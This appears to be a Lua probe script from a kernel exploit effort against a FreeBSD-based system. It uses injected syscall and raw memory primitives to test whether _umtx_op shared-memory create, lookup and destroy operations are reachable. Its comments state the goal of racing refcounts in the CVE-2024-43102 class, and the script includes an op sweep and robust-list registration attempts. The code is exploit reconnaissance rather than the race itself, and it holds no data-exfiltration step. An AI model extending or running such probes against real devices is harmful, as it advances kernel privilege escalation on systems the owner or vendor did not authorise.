-- CRASH_CLASS: MODERATE
-- PROBE 80p: UMTX_OP_SHM reachability on syscall 454
--
-- All prior "umtx" probes called syscall 557 (namedobj_create).
-- The REAL _umtx_op is syscall 454. 56i2 section F is the only saved
-- 454 execution (ops 5/21 ret=0).
--
-- UMTX_OP_SHM = 25: creates/destroys shared memory segments backed by
-- the umtx subsystem. If create+destroy work, we can race refcounts
-- with threads (CVE-2024-43102 class).
--
-- This probe tests:
--   A) UMTX_OP_SHM create (op=25, val=0/UMTX_SHM_CREAT)
--   B) UMTX_OP_SHM lookup (op=25, val=1/UMTX_SHM_LOOKUP)
--   C) UMTX_OP_SHM destroy (op=25, val=2/UMTX_SHM_DESTROY)
--   D) Other UMTX ops: WAIT(0), WAKE(1), MUTEX_LOCK(5), MUTEX_UNLOCK(6)
--   E) UMTX_OP_ROBUST_LISTS(26) — registers robust futex list

print("=== PROBE 80p: UMTX_OP_SHM on syscall 454 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
local pid = syscall.sc_getpid():tonumber()
print("[*] pid=" .. pid)

local sc_umtx = make_syscall(454)

-- =================================================================
-- SECTION A: Basic UMTX ops (WAIT, WAKE, MUTEX)
-- Confirm 454 is reachable and which ops work
-- =================================================================
print("")
print("=== [A] BASIC UMTX OPS ===")

local futex = memory.alloc(64)
zero(futex, 64)

-- FreeBSD _umtx_op(void *obj, int op, u_long val, void *uaddr1, void *uaddr2)

-- UMTX_OP_WAIT (0): wait on *obj == val, with timeout
-- Use a non-matching value so it returns immediately
wd(futex, 42)
local ok_w, rv_w = pcall(function()
    -- obj=futex, op=0(WAIT), val=99(won't match), uaddr1=0(no timeout), uaddr2=0
    return sc_umtx(uint64(futex), uint64(0), uint64(99), uint64(0), uint64(0))
end)
print("[A] UMTX_OP_WAIT(0): ok=" .. tostring(ok_w) .. " rv=" .. tostring(to_num(rv_w)))

-- UMTX_OP_WAKE (1): wake waiters on obj
local ok_wk, rv_wk = pcall(function()
    return sc_umtx(uint64(futex), uint64(1), uint64(1), uint64(0), uint64(0))
end)
print("[A] UMTX_OP_WAKE(1): ok=" .. tostring(ok_wk) .. " rv=" .. tostring(to_num(rv_wk)))

-- UMTX_OP_MUTEX_TRYLOCK (5)
zero(futex, 64)
local ok_ml, rv_ml = pcall(function()
    return sc_umtx(uint64(futex), uint64(5), uint64(0), uint64(0), uint64(0))
end)
print("[A] UMTX_OP_MUTEX_TRYLOCK(5): ok=" .. tostring(ok_ml) .. " rv=" .. tostring(to_num(rv_ml)))
print("    futex[0]=0x" .. string.format("%08X", rd(futex) or 0))

-- UMTX_OP_MUTEX_UNLOCK (6)
local ok_mu, rv_mu = pcall(function()
    return sc_umtx(uint64(futex), uint64(6), uint64(0), uint64(0), uint64(0))
end)
print("[A] UMTX_OP_MUTEX_UNLOCK(6): ok=" .. tostring(ok_mu) .. " rv=" .. tostring(to_num(rv_mu)))
print("    futex[0]=0x" .. string.format("%08X", rd(futex) or 0))

-- UMTX_OP_NWAKE_PRIVATE (21)
local ok_np, rv_np = pcall(function()
    return sc_umtx(uint64(futex), uint64(21), uint64(1), uint64(0), uint64(0))
end)
print("[A] UMTX_OP_NWAKE_PRIVATE(21): ok=" .. tostring(ok_np) .. " rv=" .. tostring(to_num(rv_np)))

-- =================================================================
-- SECTION B: UMTX_OP_SHM (25) — CREATE
-- FreeBSD 11 signature: _umtx_op(NULL, UMTX_OP_SHM, UMTX_SHM_CREAT, uaddr1, 0)
-- uaddr1 = key pointer (address used as SHM key)
-- Returns: fd to the shared memory segment
-- =================================================================
print("")
print("=== [B] UMTX_OP_SHM CREATE ===")

-- UMTX_SHM_CREAT = 0 (some FreeBSD versions)
-- Actually in FreeBSD: the "val" parameter encodes the sub-operation:
-- val & 0x3: 0=CREAT, 1=LOOKUP, 2=DESTROY
-- val & ~0x3: flags

local shm_key = memory.alloc(64)
zero(shm_key, 64)
wd(shm_key, 0x12345678)  -- arbitrary key value

-- Try create: obj=NULL, op=25, val=0(CREAT), uaddr1=shm_key, uaddr2=0
local ok_sc, rv_sc = pcall(function()
    return sc_umtx(uint64(0), uint64(25), uint64(0), uint64(shm_key), uint64(0))
end)
local shm_rv = to_num(rv_sc)
print("[B] SHM_CREAT: ok=" .. tostring(ok_sc) .. " rv=" .. shm_rv)

if shm_rv >= 0 and shm_rv < 1000 and ok_sc then
    print("[B] *** SHM CREATED — fd=" .. shm_rv .. " ***")

    -- Try lookup
    local ok_lu, rv_lu = pcall(function()
        return sc_umtx(uint64(0), uint64(25), uint64(1), uint64(shm_key), uint64(0))
    end)
    print("[B] SHM_LOOKUP: ok=" .. tostring(ok_lu) .. " rv=" .. tostring(to_num(rv_lu)))

    -- Try destroy
    local ok_dy, rv_dy = pcall(function()
        return sc_umtx(uint64(0), uint64(25), uint64(2), uint64(shm_key), uint64(0))
    end)
    print("[B] SHM_DESTROY: ok=" .. tostring(ok_dy) .. " rv=" .. tostring(to_num(rv_dy)))

    -- Close the fd
    pcall(function() make_syscall(6)(uint64(shm_rv)) end)

    -- Try create again after destroy
    local ok_sc2, rv_sc2 = pcall(function()
        return sc_umtx(uint64(0), uint64(25), uint64(0), uint64(shm_key), uint64(0))
    end)
    print("[B] SHM_CREAT2: ok=" .. tostring(ok_sc2) .. " rv=" .. tostring(to_num(rv_sc2)))

    if ok_sc2 and to_num(rv_sc2) >= 0 then
        print("[B] *** SHM CREATE+DESTROY+RECREATE ALL WORK ***")
        print("[B] *** CVE-2024-43102 RACE IS TESTABLE ***")
        pcall(function() make_syscall(6)(uint64(to_num(rv_sc2))) end)
    end
else
    print("[B] SHM create returned " .. shm_rv .. " — trying alternate arg layouts...")

    -- Try with obj=shm_key instead of uaddr1
    local ok_a2, rv_a2 = pcall(function()
        return sc_umtx(uint64(shm_key), uint64(25), uint64(0), uint64(0), uint64(0))
    end)
    print("[B] alt1 (obj=key): rv=" .. tostring(to_num(rv_a2)))

    -- Try with val=UMTX_SHM_CREAT as separate flags
    for val = 0, 3 do
        local ok_v, rv_v = pcall(function()
            return sc_umtx(uint64(0), uint64(25), uint64(val), uint64(shm_key), uint64(0))
        end)
        print("[B] val=" .. val .. ": ok=" .. tostring(ok_v) .. " rv=" .. tostring(to_num(rv_v)))
    end

    -- Try with non-zero obj
    for _, obj_val in ipairs({1, shm_key, futex}) do
        local ok_o, rv_o = pcall(function()
            return sc_umtx(uint64(obj_val), uint64(25), uint64(0), uint64(shm_key), uint64(0))
        end)
        print("[B] obj=" .. q(uint64(obj_val)) .. ": rv=" .. tostring(to_num(rv_o)))
    end
end

-- =================================================================
-- SECTION C: UMTX_OP_ROBUST_LISTS (26)
-- Registers a robust futex list pointer with the kernel.
-- FreeBSD 11: _umtx_op(uaddr1=list_head, op=26, val=sizeof(struct), 0, 0)
-- =================================================================
print("")
print("=== [C] UMTX_OP_ROBUST_LISTS (26) ===")

local robust_list = memory.alloc(128)
zero(robust_list, 128)

-- struct umtx_robust_lists_params { uintptr_t robust_list_offset; ... }
-- Try different sizes (FreeBSD uses sizeof(struct umtx_robust_lists_params))
for _, sz in ipairs({8, 16, 24, 32, 48, 64}) do
    local ok_r, rv_r = pcall(function()
        return sc_umtx(uint64(robust_list), uint64(26), uint64(sz), uint64(0), uint64(0))
    end)
    print("[C] ROBUST_LISTS sz=" .. sz .. ": ok=" .. tostring(ok_r) .. " rv=" .. tostring(to_num(rv_r)))
    if ok_r and to_num(rv_r) == 0 then
        print("[C] *** ROBUST_LISTS REGISTERED (sz=" .. sz .. ") ***")
        break
    end
end

-- =================================================================
-- SECTION D: Sweep UMTX ops 0-30
-- Quick survey of which ops return 0 vs -1
-- =================================================================
print("")
print("=== [D] UMTX OP SWEEP ===")

zero(futex, 64)
wd(futex, pid)  -- some ops check owner = current thread

for op = 0, 30 do
    if op ~= 0 then  -- skip WAIT (might block if value matches)
        local ok_op, rv_op = pcall(function()
            return sc_umtx(uint64(futex), uint64(op), uint64(0), uint64(0), uint64(0))
        end)
        local rv_n = -999
        if ok_op then rv_n = to_num(rv_op) end
        if rv_n == 0 then
            print("[D] op=" .. op .. " → ret=0 ***")
        elseif rv_n ~= 0xFFFFFFFF and rv_n ~= -999 then
            print("[D] op=" .. op .. " → ret=" .. rv_n .. " (UNUSUAL)")
        end
    end
end

-- Check if process is alive
local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] alive=" .. tostring(alive))
print("=== PROBE 80p COMPLETE ===")
